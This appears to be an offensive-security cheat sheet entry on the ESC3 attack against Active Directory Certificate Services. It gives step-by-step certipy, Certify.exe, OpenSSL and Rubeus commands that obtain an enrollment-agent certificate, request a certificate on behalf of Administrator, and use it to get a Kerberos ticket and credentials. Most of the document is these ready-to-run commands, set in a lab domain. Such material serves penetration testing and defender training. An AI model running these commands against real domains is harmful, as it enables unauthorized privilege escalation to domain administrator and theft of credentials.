# 13.06 ESC3 Certificate Request Agent

> Enroll in an Enrollment-Agent (`1.3.6.1.4.1.311.20.2.1`) template, then request a second cert on-behalf-of Administrator via that cert.

## Overview

Two-step attack exploiting the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1). Step 1 enrolls in a template with this EKU to get an enrollment-agent certificate. Step 2 uses that certificate to request a second certificate on behalf of any user (e.g., Administrator) from a template that allows client authentication. Works from both Linux and Windows.

## Steps

- Identify Condition 1 template: Enrollment Agent: True, low-priv enrollment rights, no manager approval
- Identify Condition 2 template: allows on-behalf-of enrollment, client authentication EKU, no CA enrollment-agent restrictions
- Step 1 (Linux): certipy req -template ESC3 → saves blwasp.pfx
- Step 2 (Linux): certipy req -template User -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
- Step 1 (Windows): Certify.exe request /template:ESC3 → convert cert.pem to cert.pfx
- Step 2 (Windows): Certify.exe request /template:User /onbehalfof:LAB\Administrator /enrollcert:cert.pfx → convert admin.pem to admin.pfx
- Authenticate with certipy auth or Rubeus asktgt /user:lab\Administrator /certificate:admin.pfx

## Commands

### certipy req step 1

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca 'lab-LAB-DC-CA' -template 'ESC3'
```

### certipy req step 2 on-behalf-of

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
```

### certipy auth

```bash
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip <TARGET>
```

### Certify.exe ESC3 step 1

```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC3
```

### OpenSSL convert step 1

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Certify.exe ESC3 step 2

```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /onbehalfof:LAB\Administrator /enrollcert:cert.pfx
```

### OpenSSL convert step 2

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
```

### Rubeus asktgt step 2

```powershell
.\Rubeus.exe asktgt /user:lab\Administrator /certificate:admin.pfx /getcredentials
```
